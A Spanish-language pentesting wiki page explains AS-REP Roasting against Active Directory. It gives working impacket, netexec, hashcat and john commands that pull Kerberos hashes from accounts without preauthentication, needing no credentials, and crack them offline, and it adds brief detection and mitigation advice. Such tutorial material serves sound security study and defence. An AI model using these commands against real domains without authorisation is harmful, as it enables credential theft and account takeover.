---
title: AS-REP Roasting
resumen: Extraer y crackear el hash de cuentas sin preautenticación Kerberos, sin necesitar credenciales.
tags: impacket, netexec, hashcat-john, rubeus
---

## Definición

Ataque que ocurre cuando una cuenta de usuario (o de servicio) tiene marcado el atributo "No requiere autenticación previa" (`DONT_REQ_PREAUTH`). Esto significa que la cuenta no necesita demostrar que conoce la contraseña antes de que el KDC le entregue el ticket Kerberos (AS-REP) correspondiente. Parte de ese AS-REP viaja cifrado con el hash NTLM de la contraseña del usuario objetivo, lo que permite extraerlo y crackearlo offline.

## Cuándo se usa

Contra usuarios con preautenticación deshabilitada; es uno de los pocos ataques de esta web que no requiere ninguna credencial previa, solo conocer o adivinar nombres de usuario válidos.

## Requisitos previos

- Conectividad con el controlador de dominio (puerto 88)
- Una lista de usuarios del dominio (no hace falta que sean válidos, solo probar)
- Idealmente, confirmación previa (por LDAP o [[bloodhound|BloodHound]]) de qué cuentas tienen `DONT_REQ_PREAUTH`

## Desarrollo del ataque

1. Enumerar o listar los usuarios candidatos del dominio.
2. Solicitar el AS-REP de cada uno sin aportar contraseña.
3. Para los usuarios vulnerables, extraer el hash del `EncryptedPart` de la respuesta.
4. Crackear ese hash offline.

```bash
# Sin credenciales, contra una lista de usuarios
impacket-GetNPUsers 'dominio.local/' -no-pass -usersfile domain_users.txt -outputfile asrep_hashes.txt -dc-ip DC_IP

# Alternativa con netexec
nxc ldap DC_IP -u domain_users.txt -p '' --asreproast asrep_hashes.txt

# Crackeo offline
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

## Herramientas relacionadas

- Ver [[impacket]] (GetNPUsers)
- Ver [[netexec]]
- Ver [[rubeus]]
- Ver [[hashcat-john]]

## Detección y mitigación

Exigir preautenticación Kerberos en todas las cuentas salvo que exista una razón técnica muy concreta para no hacerlo, y monitorizar el evento 4768 en busca de tipos de cifrado débiles o solicitudes AS-REQ sin `PA-ENC-TIMESTAMP`.
